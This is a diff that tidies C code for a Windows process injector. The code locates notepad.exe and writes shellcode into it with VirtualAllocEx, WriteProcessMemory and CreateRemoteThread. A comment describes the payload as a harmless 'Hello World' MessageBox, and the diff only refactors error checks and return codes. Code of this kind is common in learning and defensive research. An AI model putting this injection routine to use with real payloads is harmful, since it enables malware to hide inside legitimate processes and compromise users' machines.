@@ -4,6 +4,7 @@
 #include <string.h>
 #include <tlhelp32.h>
 
+#define IS_HANDLE_INVALID(x) (x==NULL || x==INVALID_HANDLE_VALUE)
 #define TARGET "notepad.exe"
 
 // "Hello World" MessageBox shellcode
@@ -45,7 +46,7 @@ DWORD find_pid(const char* procname) {
     DWORD pid = 0;
     PROCESSENTRY32 pe32;
     
-    // Take Snapshot all processes on the system
+    // Take Snapshot of all processes on the system
     // See: https://learn.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-createtoolhelp32snapshot
     HANDLE hProcSnap = CreateToolhelp32Snapshot(
         TH32CS_SNAPPROCESS, //  Take a snapshot of the processes
@@ -53,7 +54,7 @@ DWORD find_pid(const char* procname) {
     );
 
     // Check if handle is valid
-    if (INVALID_HANDLE_VALUE == hProcSnap) {
+    if (IS_HANDLE_INVALID(hProcSnap)) {
         fprintf(stderr, "[!] CreateToolhelp32Snapshot() failed (0x%x)\n", GetLastError());
         return 0;
     }
@@ -95,7 +96,7 @@ int inject_shellcode(DWORD pid) {
         pid    // PID of process to open
     );
 
-    if (INVALID_HANDLE_VALUE == hProc) {
+    if (IS_HANDLE_INVALID(hProc)) {
         fprintf(stderr, "[!] OpenProcess() failed (0x%x)\n", GetLastError());
         return -1;
     }
@@ -103,11 +104,11 @@ int inject_shellcode(DWORD pid) {
     // Reserves, commits, or changes the state of a 
     // region of memory within the virtual address space of a specified process. 
     LPVOID pRemoteCode = VirtualAllocEx(
-        hProc,                  // Handle to process to allocate memory to
-        NULL,                   // No desired starting address
-        payload_len,            // Size of memory to allocate
-        MEM_COMMIT,             // Make the specified memory range available for use by the process
-        PAGE_EXECUTE_READ       // R+X 
+        hProc,                                // Handle to process to allocate memory to
+        NULL,                                 // No desired starting address
+        payload_len,                          // Size of memory to allocate
+        MEM_RESERVE | MEM_COMMIT,             // Make the specified memory range available for use by the process
+        PAGE_EXECUTE_READ                     // R+X 
     );
         
     if (NULL == pRemoteCode) {
@@ -126,16 +127,18 @@ int inject_shellcode(DWORD pid) {
         (SIZE_T *)&bWritten
     );
 
+    // Check if the whole payload was written into the 
+    // target process's virtual memory
     if (bWritten != payload_len) {
         fprintf(stderr, "[!] WriteProcessMemory() failed to write complete payload (0x%x)\n", GetLastError());
         CloseHandle(hProc);
-        return -2;
+        return -1;
     }
         
     if (!result) {
         fprintf(stderr, "[!] WriteProcessMemory() failed (0x%x)\n", GetLastError());
         CloseHandle(hProc);
-        return -3;
+        return -1;
     }
 
     // Creates a thread that runs in the virtual address space of another process.
@@ -150,10 +153,10 @@ int inject_shellcode(DWORD pid) {
         NULL                // The thread identifier is not returned
     );
 
-    if (hThread == NULL) {
+    if (IS_HANDLE_INVALID(hThread)) {
         fprintf(stderr, "[!] CreateRemoteThread() failed (0x%x)\n", GetLastError());
         CloseHandle(hProc);
-        return -4;
+        return -1;
     }
 
     // Wait for thread to finish execution
@@ -162,7 +165,7 @@ int inject_shellcode(DWORD pid) {
         fprintf(stderr, "[!] WaitForSingleObject() failed (0x%x)\n", GetLastError());
         CloseHandle(hThread);        
         CloseHandle(hProc);
-        return -5;
+        return -1;
     } 
     CloseHandle(hThread);
     CloseHandle(hProc);
